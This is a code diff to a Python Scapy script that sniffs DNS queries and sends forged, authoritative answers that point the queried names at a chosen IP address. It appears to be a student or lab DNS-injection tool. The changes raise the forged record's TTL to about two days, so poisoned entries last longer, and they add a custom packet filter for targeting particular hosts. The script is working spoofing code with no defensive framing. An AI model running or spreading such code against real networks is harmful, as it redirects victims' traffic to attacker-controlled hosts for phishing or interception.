@@ -8,7 +8,7 @@ from scapy.all import *
 
 hips = dict()
 localhost_ip = None
-#pkt.getlayer(DNS).qr == 0
+
 def get_localhost_ip(interface=None):
     if interface:
         return netifaces.ifaddresses(interface)[AF_INET][0]['addr']
@@ -52,7 +52,7 @@ def process_pkt(pkt):
         inj_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                   UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                   DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
-                  an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=100, rdata=r_ip))
+                  an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=197462, rdata=r_ip))
         send(inj_pkt)
 
 def main(argv):
@@ -76,6 +76,10 @@ def main(argv):
 
     #print interface
     #print hostsfile
+    expr = args
+    bpf_filter = 'udp port 53'
+    if expr:
+        bpf_filter = expr[0] + ' and udp port 53'
 
     localhost_ip = get_localhost_ip()
     #print 'localhost ip is', localhost_ip
@@ -94,9 +98,9 @@ def main(argv):
         #print hips
 
     if interface:
-        sniff(iface=interface, filter='udp and port 53', store=0, prn=process_pkt)
+        sniff(iface=interface, filter=bpf_filter, store=0, prn=process_pkt)
     else:
-        sniff(filter='udp port 53', store=0, prn=process_pkt)
+        sniff(filter=bpf_filter, store=0, prn=process_pkt)
 
 if __name__ == "__main__":
    main(sys.argv[1:])
